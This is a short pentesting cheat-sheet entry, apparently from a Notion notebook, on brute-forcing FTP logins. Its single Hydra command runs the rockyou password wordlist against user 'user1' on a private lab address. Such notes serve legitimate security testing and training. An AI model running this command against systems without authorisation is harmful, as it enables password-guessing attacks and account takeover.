# Hydra Brute Force FTP

OS: Linux
Description: brute force ftp
Security Domains: Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21)
Target_Technology: ftp (https://www.notion.so/ftp-1434c8e5237680bcaf18c24e9f10cb87?pvs=21)

```jsx
hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142
```